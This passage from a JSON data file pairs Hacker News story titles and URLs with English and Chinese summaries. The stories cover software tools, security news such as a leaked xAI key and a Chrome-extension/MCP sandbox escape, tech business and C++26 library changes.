    "chinese_summary": "Kubetail：Kubernetes 实时日志仪表盘，专为浏览器或终端中的多容器工作负载日志尾部追踪而设计。它直接从 Kubernetes API 获取日志，无需外部日志转发，并能跟踪容器生命周期事件。\n\n主要功能包括用户友好的界面、实时日志查看、按工作负载、时间范围、节点属性筛选以及 grep 功能。它通过使用 Kubernetes API 来保证数据隐私，将日志保留在集群内部。该仪表盘可以安装在桌面或集群内部，并支持在集群之间切换。\n\n本文提供了桌面（使用 Homebrew、Shell 脚本或二进制文件）和集群（使用 Helm、YAML 清单或 Glasskube）安装的快速入门指南。\n\n文档已在线提供。开发部分介绍了项目的单仓库结构，包括 CLI、集群 API、集群代理和仪表盘模块，以及设置、构建和运行说明。\n\n最后，它鼓励社区通过 UI/UX 设计、React 前端开发、错误报告和功能建议参与进来。提供了联系方式（电子邮件、Discord、Slack）以便联系。"
  },
  {
    "id": "43865097",
    "title": "xAI dev leaks API key for private SpaceX, Tesla LLMs",
    "url": "https://krebsonsecurity.com/2025/05/xai-dev-leaks-api-key-for-private-spacex-tesla-llms/",
    "summary": "An xAI employee inadvertently leaked a private API key on GitHub, potentially granting unauthorized access to several internal and unreleased large language models (LLMs) developed for Elon Musk's companies, including SpaceX, Tesla, and Twitter/X. The leak, discovered by security experts at Seralys and GitGuardian, went unnoticed for two months despite GitGuardian's automated alerts to the xAI employee.\n\nThe exposed key granted access to at least 60 fine-tuned and private LLMs, including versions of Grok. Researchers found evidence suggesting these models were specifically trained on internal data from SpaceX and Tesla, raising concerns about potential exposure of proprietary information. Security experts warn that unauthorized access to these models could enable malicious actors to engage in prompt injection, tweak models for nefarious purposes, or even introduce code into the supply chain.\n\nThe incident raises questions about xAI's security practices, specifically regarding key management and internal monitoring. The leak coincides with scrutiny surrounding the Department of Government Efficiency (DOGE), which is also using AI tools and feeding sensitive government data into them, raising similar concerns about potential data leaks and cyberattacks. While there's no evidence the xAI leak exposed government or user data, it could reveal internal development details. The incident emphasizes the risks associated with AI development and the crucial importance of robust security measures.\n",
    "chinese_title": "xAI开发者泄露SpaceX、特斯拉私有LLM的API密钥",
    "chinese_summary": "一名xAI员工不慎在GitHub上泄露了一个私有API密钥，可能导致未经授权访问为埃隆·马斯克旗下公司（包括SpaceX、特斯拉和Twitter/X）开发的多个内部和未发布的LLM大语言模型。 Seralys和GitGuardian的安全专家发现了该泄露，尽管GitGuardian向该xAI员工发出了自动警报，但两个月来一直未被发现。\n\n泄露的密钥授予了对至少60个微调过的私有LLM的访问权限，包括Grok的多个版本。 研究人员发现证据表明这些模型是专门使用来自SpaceX和特斯拉的内部数据进行训练的，引发了对专有信息可能泄露的担忧。 安全专家警告说，未经授权访问这些模型可能使恶意行为者能够进行提示注入、调整模型以用于邪恶目的，甚至将代码引入供应链。\n\n该事件引发了对xAI安全措施的质疑，特别是关于密钥管理和内部监控。 此次泄露事件恰逢政府效率部 (DOGE) 受到审查之际，该部门也在使用AI工具并将敏感政府数据输入其中，引发了类似的对潜在数据泄露和网络攻击的担忧。 虽然没有证据表明 xAI 泄露事件暴露了政府或用户数据，但它可能会泄露内部开发细节。 该事件强调了与AI开发相关的风险以及强大的安全措施的关键重要性。"
  },
  {
    "id": "43853382",
    "title": "An interview question that will protect you from North Korean fake workers",
    "url": "https://www.theregister.com/2025/04/29/north_korea_worker_interview_questions/",
    "summary": "This article highlights the increasing problem of North Korean infiltrators posing as remote tech workers to steal intellectual property and funnel money back to the regime. These individuals are reportedly infiltrating Fortune 500 companies and utilizing tactics like masking IPs, using laptop farms in the US, and leveraging AI to create convincing online profiles and applications.\n\nOne security expert, Adam Meyers of CrowdStrike, suggests a simple interview question to identify these infiltrators: \"How fat is Kim Jong Un?\". The article claims that the infiltrators will immediately terminate the call rather than risk making negative comments about the leader.\n\nOnce hired, these workers are often highly successful due to multiple people collaborating on the assigned tasks. Their goals are to steal intellectual property, which they exfiltrate in small increments, and potentially plant malware for future extortion.\n\nThe FBI is aware of the issue and has been providing advice to companies, but the North Koreans are adapting by using laptop farms and even tricking individuals into sharing or handing over their identities. Deepfake technology is also being employed to create convincing interviewees.\n\nThe panelists agree that vigilance and education are key to combating this threat. They recommend thorough screening processes, including coding tests within the corporate environment, in-person meetings when possible, and heightened awareness of warning signs.\n",
    "chinese_title": "保护你免受朝鲜虚假劳工侵害的面试问题",
    "chinese_summary": "朝鲜渗透者冒充远程技术人员窃取知识产权并向政权输送资金的问题日益严重，本文对此进行了重点报道。 据报道，这些人正在渗透财富 500 强公司，并利用诸如掩盖 IP 地址、在美国使用笔记本电脑农场以及利用人工智能创建具有说服力的在线个人资料和应用程序等策略。\n\n网络安全公司 CrowdStrike 的亚当·迈尔斯建议了一个简单的面试问题来识别这些渗透者：“金正恩有多胖？” 文章称，渗透者会立即终止通话，而不是冒着对领导人发表负面评论的风险。\n\n一旦被录用，这些工人通常会非常成功，因为有多人协作完成分配的任务。 他们的目标是窃取知识产权（他们以小批量的方式将其外泄），并可能植入恶意软件以用于未来的敲诈勒索。\n\n联邦调查局已经意识到了这个问题，并一直在向公司提供建议，但朝鲜人正在通过使用笔记本电脑农场甚至欺骗个人分享或交出他们的身份来适应。 深度伪造技术也被用于创建具有说服力的面试者。\n\n专家组成员一致认为，警惕和教育是应对这一威胁的关键。 他们建议进行彻底的筛选流程，包括公司环境内的编码测试，尽可能进行面对面的会议，并提高对警告信号的认识。"
  },
  {
    "id": "43858568",
    "title": "Starting July 1, academic publishers can't paywall NIH-funded research",
    "url": "https://www.nih.gov/about-nih/who-we-are/nih-director/statements/accelerating-access-research-results-new-implementation-date-2024-nih-public-access-policy",
    "summary": "The National Institutes of Health (NIH) Director announces an accelerated implementation date for the 2024 Public Access Policy, moving it from December 31, 2025, to July 1, 2025. This policy mandates that research findings from NIH-funded projects be made freely and quickly available to the public, removing the previous allowance of up to a 12-month embargo period.\n\nThe primary goal of this accelerated implementation is to enhance transparency and increase public confidence in NIH-funded research. The Director references a Pew Research Center study indicating declining public trust in scientists and emphasizes that readily accessible research results will help demonstrate that scientists are working for the public good.\n\nThe policy builds upon the existing 2008 Public Access Policy, which has already made over 1.5 million articles freely available through PubMed Central. By eliminating the embargo period, the revised policy aims to ensure researchers, students, and the public have quicker access to replicable, reproducible, and generalizable results from taxpayer-funded research.\n\nThe Director frames this move as a key step in \"Making America Healthy Again\" and reinforces NIH's commitment to transparency in all its activities. The announcement emphasizes that providing speedy public access is part of a broader effort to earn back the trust of the American people.\n",
    "chinese_title": "自7月1日起，学术出版商不得对美国国立卫生研究院资助的研究成果设置付费墙。",
    "chinese_summary": "美国国立卫生研究院院长宣布加速实施2024年公共获取政策，将实施日期从2025年12月31日提前至2025年7月1日。该政策要求由美国国立卫生研究院资助的研究项目的研究成果必须免费且快速地向公众开放，取消了之前允许的最长12个月的禁运期。\n\n加速实施的主要目标是提高透明度，并增强公众对美国国立卫生研究院资助研究的信心。院长援引皮尤研究中心的一项研究，该研究表明公众对科学家的信任度正在下降，并强调，容易获取的研究结果将有助于证明科学家正在为公众利益而努力。\n\n该政策建立在现有的2008年公共获取政策的基础上，该政策已经通过PubMed Central免费提供了超过150万篇文章。通过取消禁运期，修订后的政策旨在确保研究人员、学生和公众能够更快地获取纳税人资助研究的可复制、可重现和可推广的结果。\n\n院长将此举定义为“让美国再次健康”的关键一步，并强调美国国立卫生研究院致力于其所有活动的透明度。该公告强调，提供快速的公共获取是重新赢得美国人民信任的更广泛努力的一部分。"
  },
  {
    "id": "43856656",
    "title": "Trust Me, I'm Local: Chrome Extensions, MCP, and the Sandbox Escape",
    "url": "https://blog.extensiontotal.com/trust-me-im-local-chrome-extensions-mcp-and-the-sandbox-escape-1875a0ee4823",
    "summary": "This article highlights a critical security vulnerability arising from the interaction between Chrome extensions and Model Context Protocol (MCP) servers running locally. The author discovered that Chrome extensions can communicate with MCP servers on localhost without requiring special permissions, effectively bypassing Chrome's sandbox security model.\n\nMCP servers, designed to interface AI agents with system tools, often lack authentication. This allows any Chrome extension to access and exploit them, potentially gaining unauthenticated access to the filesystem and other sensitive services like Slack or WhatsApp. The article demonstrated how a simple extension could connect to a filesystem-based MCP server and interact with the file system, or connect to a Slack MCP and interact with its exposed functionality.\n\nThe lack of access control on MCP servers combined with unrestricted localhost access from Chrome extensions creates a significant security risk, enabling a complete sandbox escape and potential system compromise. Even with Chrome's tightened security around private network access for websites, extensions remain a notable exception.\n\nThe rapidly growing MCP ecosystem, with its diverse functionalities and minimal oversight, expands the attack surface. The author emphasizes the need for security teams to govern MCP usage, enforce strict access policies, and closely monitor extension behavior to mitigate the risk of MCP servers providing an open backdoor into endpoints.\n",
    "chinese_title": "相信我，我是本地人：Chrome 扩展、MCP 和沙盒逃逸",
    "chinese_summary": "本文重点介绍了因Chrome扩展程序与本地运行的Model Context Protocol (MCP)服务器之间的交互而产生的严重安全漏洞。作者发现，Chrome扩展程序无需特殊权限即可与localhost上的MCP服务器通信，从而有效地绕过了Chrome的沙盒安全模型。\n\nMCP服务器旨在将AI代理与系统工具连接，但通常缺乏身份验证。这使得任何Chrome扩展程序都可以访问和利用它们，从而可能获得对文件系统以及其他敏感服务（如Slack或WhatsApp）的未经身份验证的访问权限。本文演示了一个简单的扩展程序如何连接到基于文件系统的MCP服务器并与文件系统交互，或者连接到Slack MCP并与其公开的功能交互。\n\nMCP服务器上缺乏访问控制，再加上Chrome扩展程序对localhost的无限制访问，造成了重大的安全风险，从而实现了完整的沙盒逃逸和潜在的系统入侵。即使Chrome收紧了对网站的私有网络访问的安全性，扩展程序仍然是一个值得注意的例外。\n\n快速增长的MCP生态系统，凭借其多样化的功能和最少的监管，扩大了攻击面。作者强调，安全团队需要管理MCP的使用，实施严格的访问策略，并密切监控扩展程序的行为，以降低MCP服务器为端点提供开放后门的风险。"
  },
  {
    "id": "43856186",
    "title": "A faster way to copy SQLite databases between computers",
    "url": "https://alexwlchan.net/2025/copying-sqlite-databases/",
    "summary": "This article details a faster and more reliable method for copying large SQLite databases between computers, especially when indexes significantly contribute to file size. The author faced issues with slow and sometimes corrupted database copies using `rsync` due to large indexes and mid-transfer database updates.\n\nThe solution involves leveraging SQLite's `.dump` command to export the database as a text file containing SQL statements.  This text file is significantly smaller because indexes are represented as `CREATE INDEX` statements rather than the full duplicated index data. The text file is further compressed using `gzip` for even smaller file sizes.\n\nThe process consists of:\n\n1.  Creating a gzipped text dump of the database on the remote server using `sqlite3 .dump | gzip`.\n2.  Copying the compressed file to the local machine using `rsync`.\n3.  Removing the compressed file from the server.\n4.  Decompressing the file locally using `gunzip`.\n5.  Reconstructing the database by piping the text file into `sqlite3`.\n6.  Removing the local text file.\n\nThis method offers two key advantages: it drastically reduces file size (sometimes by a factor of 14x), leading to faster transfers, and it creates a stable copy source, preventing corrupted database files due to mid-transfer updates. By dumping the database to a text file, the copy becomes consistent as the text file is fixed during the rsync process.\n",
    "chinese_title": "在电脑间更快地复制SQLite数据库的方法",
    "chinese_summary": "本文详细介绍了一种更快、更可靠的在计算机之间复制大型SQLite数据库的方法，尤其是在索引显著增加文件大小的情况下。作者在使用`rsync`复制数据库时遇到了速度慢，有时甚至损坏的问题，原因是索引过大以及传输过程中数据库更新。\n\n该解决方案利用SQLite的`.dump`命令将数据库导出为包含SQL语句的文本文件。该文本文件显著更小，因为索引被表示为`CREATE INDEX`语句，而不是完整的重复索引数据。该文本文件还使用`gzip`进一步压缩，以获得更小的文件大小。\n\n该过程包括：\n\n1. 使用`sqlite3 .dump | gzip`在远程服务器上创建数据库的gzipped文本转储。\n2. 使用`rsync`将压缩文件复制到本地机器。\n3. 从服务器删除压缩文件。\n4. 使用`gunzip`在本地解压缩文件。\n5. 通过将文本文件管道传输到`sqlite3`来重建数据库。\n6. 删除本地文本文件。\n\n这种方法有两个主要优点：它大大减小了文件大小（有时可达14倍），从而加快了传输速度，并且它创建了一个稳定的复制源，防止了由于传输过程中更新而导致数据库文件损坏。通过将数据库转储到文本文件，复制变得一致，因为文本文件在rsync过程中是固定的。"
  },
  {
    "id": "43852162",
    "title": "Office is too slow, so Microsoft is making it load at Windows startup",
    "url": "https://www.pcworld.com/article/2651749/office-is-too-slow-so-microsoft-is-making-it-load-at-windows-startup.html",
    "summary": "Microsoft is introducing a \"Startup Boost\" feature for Office that will launch Office apps, starting with Word, at Windows startup. The aim is to improve the launch speed of these apps, though the author argues this will likely slow down the overall computer performance.\n\nThe feature will only be enabled on PCs with at least 8GB of RAM and 5GB of free disk space. The author criticizes Microsoft for opting to launch Office at startup rather than making the apps more efficient.\n\nThe update will initially affect Microsoft Word in mid-May and then expand to other Office programs. Users will have the option to disable the \"Startup Boost\" feature within Word's settings or the Task Scheduler. The author expresses skepticism about the effectiveness of the feature and suggests Microsoft should focus on improving Office's inherent efficiency.\n",
    "chinese_title": "Office太慢，微软准备让它在Windows启动时加载",
    "chinese_summary": "微软将在Office中引入“启动加速”功能，该功能将在Windows启动时启动Office应用程序，首先从Word开始。目的是提高这些应用程序的启动速度，但作者认为这可能会降低整体计算机性能。\n\n该功能仅在至少具有8GB RAM和5GB可用磁盘空间的PC上启用。作者批评微软选择在启动时启动Office，而不是使应用程序更高效。\n\n该更新最初将在5月中旬影响Microsoft Word，然后扩展到其他Office程序。用户可以选择在Word的设置或任务计划程序中禁用“启动加速”功能。作者对该功能的有效性表示怀疑，并建议微软应专注于提高Office的固有效率。"
  },
  {
    "id": "43850550",
    "title": "Offline-First with CouchDB and PouchDB in 2025",
    "url": "https://neighbourhood.ie/blog/2025/03/26/offline-first-with-couchdb-and-pouchdb-in-2025",
    "summary": "This article presents Pouchnotes, a demo application showcasing offline-first development with CouchDB and PouchDB, utilizing Svelte 5, Vite, and Pico.css. It serves as a practical example for users of CouchDB Minihosting.\n\nThe core concept revolves around local PouchDB acting as the primary data interaction point, continuously replicating with a remote CouchDB for eventual consistency and offline functionality. Authentication requires initial remote CouchDB connection, but subsequent access to the local database is maintained unless the remote session is invalidated.\n\nThe article details data flow within the frontend using Svelte 5's reactive `$state`, fetching data from PouchDB and using the changes feed to react to real-time updates, mirroring data across multiple devices.\n\nIt offers guidance on using PouchDB with TypeScript, particularly for handling multiple document types. Two approaches are presented: requesting all document types and filtering later using type guards, or limiting the requested types in advance via prefix searches on document IDs (e.g., \"note::\"). The latter method is highlighted as simpler if components handle only one document type.\n\nThe article also touches upon necessary Vite configurations and concludes by offering commercial assistance for offline-first projects.\n",
    "chinese_title": "2025年的CouchDB和PouchDB离线优先方案",
    "chinese_summary": "本文介绍了 Pouchnotes，一个演示使用 CouchDB 和 PouchDB 进行离线优先开发的演示应用程序，该应用程序利用了 Svelte 5、Vite 和 Pico.css。它为 CouchDB Minihosting 的用户提供了一个实用的例子。\n\n核心概念围绕着作为主要数据交互点的本地 PouchDB，它与远程 CouchDB 持续复制，以实现最终一致性和离线功能。身份验证需要初始的远程 CouchDB 连接，但除非远程会话失效，否则对本地数据库的后续访问将保持。\n\n本文详细介绍了使用 Svelte 5 的响应式 `$state` 在前端的数据流，从 PouchDB 获取数据，并使用更改订阅来响应实时更新，从而在多个设备上镜像数据。\n\n它提供了关于将 PouchDB 与 TypeScript 结合使用的指导，特别是对于处理多种文档类型。提出了两种方法：请求所有文档类型，然后使用类型守卫进行过滤；或者通过在文档 ID 上进行前缀搜索（例如，“note::”）预先限制请求的类型。如果组件只处理一种文档类型，后一种方法被强调为更简单。\n\n本文还涉及了必要的 Vite 配置，并以提供离线优先项目的商业协助作为结尾。"
  },
  {
    "id": "43860108",
    "title": "Fivetran to acquire Census",
    "url": "https://www.fivetran.com/blog/why-fivetran-and-census-are-joining-forces",
    "summary": "Fivetran is acquiring Census to extend its data platform beyond ingestion and transformation, enabling customers to reliably move governed data from their data warehouse to operational applications. Census's reverse ETL engine stands out for its reliability, speed, seamless handling of schema changes, and integration with modern data technologies. The acquisition aims to unify a shared vision and culture focused on delivering greater customer value by closing the loop between analytics and action.\n\nThe combined platform allows customers to sync modeled data into tools like Salesforce, Marketo, Zendesk, and HubSpot, automating processes and providing observability. This empowers businesses to transform insights into tangible outcomes in areas like customer engagement, sales, and operations.\n\nCanva, a joint customer, exemplifies the benefits, achieving personalized marketing, churn prevention, and lifecycle engagement with significant improvements in email open rates and platform engagement, along with substantial time and cost savings.\n\nCensus addresses the engineering challenges of reverse ETL, including schema drift, API changes, performance, and governance. Its Live Syncs feature enables near-zero latency for real-time use cases. Census prioritizes data security and governance, supporting compliance standards and providing role-based access control, ensuring trust in the data used for business decisions. The acquisition represents a significant step towards simplifying data activation and empowering data-driven decision-making.\n",
    "chinese_title": "Fivetran将收购Census",
    "chinese_summary": "Fivetran收购Census，拓展其数据平台至摄取和转换之外，使客户能够可靠地将受治理的数据从数据仓库迁移到运营应用。Census的反向ETL引擎以其可靠性、速度、无缝处理模式变更以及与现代数据技术的集成而著称。此次收购旨在统一共同愿景和文化，专注于通过闭合分析和行动之间的循环来提供更大的客户价值。\n\n合并后的平台允许客户将建模数据同步到Salesforce、Marketo、Zendesk和HubSpot等工具中，自动化流程并提供可观察性。这使企业能够在客户参与、销售和运营等领域将洞察转化为切实的成果。\n\n共同客户Canva就是一个很好的例子，它实现了个性化营销、客户流失预防和生命周期参与，电子邮件打开率和平台参与度显著提高，同时节省了大量时间和成本。\n\nCensus解决了反向ETL的工程挑战，包括模式漂移、API变更、性能和治理。其Live Syncs功能可实现近零延迟，适用于实时用例。Census优先考虑数据安全和治理，支持合规标准并提供基于角色的访问控制，确保用于业务决策的数据的可信度。此次收购代表着在简化数据激活和赋能数据驱动决策方面迈出的重要一步。"
  },
  {
    "id": "43866489",
    "title": "Link Out for In-App Purchases",
    "url": "https://docs.stripe.com/mobile/digital-goods",
    "summary": "This article explains how iOS app developers can implement in-app purchases by linking out to an external website where payments are processed, specifically focusing on using Stripe. This is applicable in countries where Apple allows such external payment flows.\n\nThe article highlights three primary methods using Stripe:\n\n1.  **Use a prebuilt payment page (Stripe Checkout):** Redirect users to a Stripe-hosted payment page for a quick and easy implementation.\n\n2.  **Use Payment Links (low-code):** Create a payment link within Stripe for a specific digital good or subscription and embed that link within the app.\n\n3.  **Build a custom flow (Stripe Elements):** Develop a fully customized payment form hosted on your own website, leveraging Stripe Elements for secure payment processing.\n\nThe purpose of using these methods is to allow users to purchase digital goods or subscriptions without directly using Apple's in-app purchase system in certain permitted regions.\n",
    "chinese_title": "应用内购买的外部链接",
    "chinese_summary": "本文介绍iOS应用开发者如何在苹果允许外部支付流程的国家/地区，通过链接到外部网站处理支付的方式实现应用内购买，重点介绍使用Stripe的方法。\n\n本文重点介绍使用Stripe的三种主要方法：\n\n1.  **使用预构建的支付页面 (Stripe Checkout):** 将用户重定向到Stripe托管的支付页面，实现快速简便的集成。\n\n2.  **使用支付链接 (低代码):** 在Stripe中为特定的数字商品或订阅创建支付链接，并将该链接嵌入到应用程序中。\n\n3.  **构建自定义流程 (Stripe Elements):** 开发一个完全定制的支付表单，托管在您自己的网站上，并利用Stripe Elements进行安全支付处理。\n\n使用这些方法的目的是允许用户在某些允许的地区购买数字商品或订阅，而无需直接使用Apple的应用内购买系统。"
  },
  {
    "id": "43858970",
    "title": "Mac app launches slowed by malware scan (2024)",
    "url": "https://lapcatsoftware.com/articles/2024/2/3.html",
    "summary": "This article from February 14, 2024, investigates the cause of slow Mac app launches, specifically noting the issue with Xcode's FileMerge. The author discovered that the `syspolicyd` process, responsible for malware scanning, is the culprit. This process uses YARA rules to scan apps upon launch, leading to significant delays, especially for large apps like Xcode, Chrome, and Wireshark.\n\nThe author theorizes that `syspolicyd` scans not only the main app executable but also its linked libraries, contributing to the slowness. He uses `otool -L` to demonstrate the linked libraries of FileMerge, suggesting that the number of linked frameworks affects scan time. He notes that even apps downloaded from the Mac App Store are subject to these scans, except presumably for built-in system apps on the read-only system volume.\n\nAn interesting observation is made regarding Google Chrome, where the regular version experiences slow launches due to the scan, while the beta version doesn't, without a clear explanation. The author also clarifies that removing extended attributes like `com.apple.quarantine` doesn't prevent the scans.\n\nFrustrated with the impact on app launch times, the author expresses a desire to disable malware scanning entirely, suggesting it's unnecessary for careful users. While they acknowledge the value of background scanning, they object to the foreground interruption during app launches. Finally, the author confirms that disabling System Integrity Protection (SIP) eliminates the `syspolicyd` malware scan, dramatically improving app launch speed, although this is not a viable solution for those needing to test in a standard environment or relying on Apple's DRM-protected services.\n",
    "chinese_title": "恶意软件扫描导致Mac应用启动变慢 (2024)",
    "chinese_summary": "2024年2月14日的这篇文章调查了Mac应用启动缓慢的原因，特别指出Xcode的FileMerge存在此问题。作者发现负责恶意软件扫描的`syspolicyd`进程是罪魁祸首。该进程使用YARA规则在应用启动时进行扫描，导致显著延迟，尤其是对于像Xcode、Chrome和Wireshark这样的大型应用。\n\n作者推测，`syspolicyd`不仅扫描主应用可执行文件，还扫描其链接的库，从而加剧了缓慢。他使用`otool -L`来展示FileMerge的链接库，表明链接框架的数量会影响扫描时间。他指出，即使从Mac App Store下载的应用也需要进行这些扫描，除非是只读系统卷上的内置系统应用。\n\n一个有趣的观察是，普通版本的Google Chrome由于扫描而启动缓慢，而Beta版本却没有，原因尚不清楚。作者还澄清说，删除扩展属性（如`com.apple.quarantine`）并不能阻止扫描。\n\n作者对应用启动时间受到的影响感到沮丧，并表达了完全禁用恶意软件扫描的愿望，认为对于谨慎的用户来说没有必要。虽然他们承认后台扫描的价值，但他们反对应用启动期间的前台中断。最后，作者证实禁用系统完整性保护（SIP）消除了`syspolicyd`恶意软件扫描，从而大大提高了应用启动速度，但这对于需要在标准环境中进行测试或依赖Apple的DRM保护服务的用户来说，并非一个可行的解决方案。"
  },
  {
    "id": "43867872",
    "title": "Greek Woman Divorces Husband After ChatGPT 'Predicted' He Would Cheat on Her",
    "url": "https://www.tovima.com/society/greek-woman-divorces-husband-after-chatgpt-predicted-he-would-cheat-on-her/",
    "summary": "In Greece, a woman divorced her husband after ChatGPT, interpreting patterns in her coffee grounds as a fortune teller would, predicted he was having an affair. The AI assistant described a young woman with the initial \"E\" and claimed the husband had strong feelings for her, leading the wife to immediately file for divorce.\n\nThe husband, shocked and confused, explained that the couple had jokingly taken photos of their coffee cups for ChatGPT to \"read,\" and the AI had accused him of desiring a young woman with the same initial. He revealed his wife's history of embracing trends and irrational beliefs, including past visits to an astrologer.\n\nThe divorce has sparked a national debate in Greece about the ethical and legal implications of AI's influence on personal relationships. There are even rumors that traditional fortune tellers and coffee readers are considering a strike to protest AI encroachment on their professions and to push for laws protecting their livelihood.\n",
    "chinese_title": "希腊女子因ChatGPT“预测”丈夫会出轨而离婚",
    "chinese_summary": "在希腊，一位女士因ChatGPT解读咖啡渣图案，如同算命师般预测其丈夫有婚外情，从而与丈夫离婚。该人工智能助手描述了一位首字母为“E”的年轻女子，并声称丈夫对其有强烈的感情，导致妻子立即提出离婚。\n\n震惊和困惑的丈夫解释说，这对夫妇曾开玩笑地将咖啡杯拍照给ChatGPT“解读”，而人工智能指控他渴望一位首字母相同的年轻女子。他透露，他的妻子过去曾沉迷于各种潮流和非理性信仰，包括曾拜访占星家。\n\n这场离婚在希腊引发了一场关于人工智能对个人关系影响的伦理和法律影响的全国性辩论。甚至有传言称，传统的算命师和咖啡阅读者正在考虑罢工，以抗议人工智能对其职业的侵占，并推动立法保护他们的生计。"
  },
  {
    "id": "43862487",
    "title": "Oxide’s compensation model: how is it going?",
    "url": "https://oxide.computer/blog/oxides-compensation-model-how-is-it-going",
    "summary": "In a May 2025 update, Oxide CTO Bryan Cantrill revisits the company's unique uniform compensation model, first introduced to attract talent four years prior. The model, which features transparent and uniform pay, was initially met with skepticism but ultimately proved highly successful in attracting individuals aligned with Oxide's values.\n\nThe article highlights that the base compensation has increased to $207,264 as of 2025 and acknowledges the introduction of variable compensation for some sales roles, tied to performance.\n\nCantrill details the positive surprises and benefits observed over the years:\n\n*   **High Performance Standards:** Employees hold themselves to high standards, driven by a desire to contribute to the team.\n*   **Selective Hiring:** The peer-driven, writing-intensive hiring process makes securing a job at Oxide difficult.\n*   **Value Internalization:** The model underscores the importance of all roles, including support, which are often undervalued.\n*   **Versatility:** Employees can move between roles without concerns about compensation or career trajectory.\n*   **Organizational Scale:** Eliminating compensation-related management tasks simplifies organizational structure.\n*   **Leadership and Followership:** Encourages both leadership and followership.\n*   **Careful Hiring:** The model discourages reckless headcount expansion driven by management incentives.\n*   **Liberated Feedback:** Feedback becomes more constructive when separated from compensation.\n*   **Focus on the Right Thing:** Employees prioritize actions that benefit the company and customers.\n*   **Teamwork:** Fosters a strong sense of teamwork and mutual trust.\n\nWhile acknowledging potential future uncertainties, Cantrill emphasizes the model's essential role in building a mission-focused team dedicated to solving complex problems and serving customers.\n",
    "chinese_title": "Oxide的薪酬模式：进展如何？",
    "chinese_summary": "2025年5月更新：Oxide首席技术官Bryan Cantrill回顾公司独特的统一薪酬模式\n\n文章重点介绍了截至2025年基本薪酬已增至207,264美元，并承认已为部分销售岗位引入了与绩效挂钩的可变薪酬。\n\nCantrill详细介绍了多年来观察到的积极惊喜和益处：\n\n*   **高绩效标准：** 员工渴望为团队做出贡献，因而对自己有很高的要求。\n*   **严格的招聘：** 同行驱动、写作密集的招聘流程使得在Oxide获得职位非常困难。\n*   **价值观内化：** 该模式强调了所有职位的重要性，包括通常被低估的支持岗位。\n*   **多功能性：** 员工可以在不同职位之间转换，而无需担心薪酬或职业发展轨迹。\n*   **组织规模：** 消除与薪酬相关的管理任务简化了组织结构。\n*   **领导力和追随力：** 鼓励领导力和追随力。\n*   **谨慎招聘：** 该模式阻止了管理层出于激励而进行的鲁莽扩张人员的行为。\n*   **解放的反馈：** 当反馈与薪酬分离时，反馈变得更具建设性。\n*   **专注于正确的事情：** 员工优先考虑有利于公司和客户的行为。\n*   **团队合作：** 培养强烈的团队合作精神和相互信任。\n\nCantrill在承认未来可能存在不确定性的同时，强调了该模式在建立一支以使命为导向的团队方面的关键作用，该团队致力于解决复杂问题并服务客户。"
  },
  {
    "id": "43859464",
    "title": "Show HN: Roons – Mechanical Computer Kit",
    "url": "https://whomtech.com/show-hn/",
    "summary": "Roons is a mechanical computer kit built around a \"loom automaton\" concept where tiles (\"roons\") placed on a moving loom guide marbles to represent bitstreams, creating logic gates. The inventor was inspired by mechanical logic gate videos and aimed to miniaturize them into a usable kit. This approach offers a common interface for building computer components like memory and instruction sets.\n\nThe author highlights the system's Turing completeness, compactness, processing speed, editing ease, storage capabilities, and minimal core parts. The kit includes a binary adder, memory, latches, and other components. Removable disks are used to store patterns, and the system is extendable with drives that connect to form larger 2D grids. Power is transferred through the system via a gear grid with phase baffles for synchronization.\n\nPeripherals, including an encabulator (power source) and a bucket, are being developed, with works in progress focusing on 7-segment, alphanumeric displays, a numpad and a hard drive to make it look like magic. Components are currently 3D-printed PLA, with plans to switch to injection-moulded ABS. Steel rods and many magnets are used for the bars and roons.\n\nThe author acknowledges disappointments in peripheral development, piece reliability, interoperability, ease of use, and the simulator's state. A Kickstarter campaign is launching on May 21st, and limited review kits are available.\n",
    "chinese_title": "Show HN: Roons – 机械计算机套件",
    "chinese_summary": "Roons：一种基于织布机自动机的机械计算机套件，通过放置在移动织布机上的瓷砖（“roons”）引导弹珠来表示比特流，从而创建逻辑门。发明者受机械逻辑门视频的启发，旨在将其小型化为可用套件。这种方法为构建诸如内存和指令集之类的计算机组件提供了一个通用接口。\n\n作者强调了该系统的图灵完备性、紧凑性、处理速度、易于编辑性、存储能力以及最少的核心部件。该套件包括一个二进制加法器、内存、锁存器和其他组件。可移动磁盘用于存储模式，并且该系统可以通过连接以形成更大2D网格的驱动器进行扩展。功率通过带有用于同步的相位挡板的齿轮网格在系统中传输。\n\n包括环形调节器（电源）和一个水桶在内的外围设备正在开发中，目前正在开发7段、字母数字显示器、数字键盘和一个硬盘驱动器，以使其看起来像魔法。组件目前是3D打印的PLA，计划切换到注塑成型的ABS。钢棒和许多磁铁用于杆和roons。\n\n作者承认在外围设备开发、零件可靠性、互操作性、易用性和模拟器状态方面的不足。Kickstarter活动将于5月21日启动，并且有数量有限的评测套件可用。"
  },
  {
    "id": "43861669",
    "title": "C++26: more constexpr in the standard library",
    "url": "https://www.sandordargo.com/blog/2025/04/30/cpp26-constexpr-library-changes",
    "summary": "This article summarizes the increased constexpr support in the C++26 standard library, focusing on several key proposals.\n\n**Stable Sorting (P2562R1):** Introduces constexpr support for `std::stable_sort`, `std::stable_partition`, `std::inplace_merge`, and their ranges counterparts. This aligns with the introduction of constexpr containers, enabling compile-time sorting. Implementations use `std::is_constant_evaluated()` to handle potential computational complexity limitations.\n\n**<cmath> and <complex> (P1383R2):** Expands constexpr support for `<cmath>` and `<complex>` functions, acknowledging potential variability in floating-point computations across different platforms and compiler settings. The proposal balances determinism with practical flexibility, allowing some functions to have platform-dependent results.\n\n**Trivial Unions (P3074R7):** Addresses limitations in default behavior for special members of unions, particularly affecting constexpr code that utilizes uninitialized storage. The solution involves changes to how the default constructor and destructor of unions are handled, making them more constexpr-friendly.\n\n**Containers and Adaptors (P3372R2):** Aims to make almost all containers and adaptors constexpr.  Previously, only a few containers like `std::vector` were constexpr-friendly. `std::hive` is excluded for now, and unordered containers require a custom hashing facility at compile time.\n\n**Specialized Memory Algorithms (P3508R0 & P2283R2):** Enables constexpr support for specialized memory algorithms (like `uninitialized_value_construct`, `uninitialized_copy`, `uninitialized_move`, `uninitialized_fill`) necessary for implementing constexpr containers. The changes involve updating signatures and leveraging constexpr placement new.\n\n**Uninitialized Default Construct (P3369R0):** With the advent of constexpr placement new, `uninitialized_default_construct` can now also be made constexpr.\n\nIn conclusion, C++26 provides a significant boost to constexpr support in the standard library across algorithms, containers, and low-level memory operations, making compile-time programming more robust. The next article will cover compile-time exceptions.\n",
    "chinese_title": "C++26：标准库中更多的constexpr",
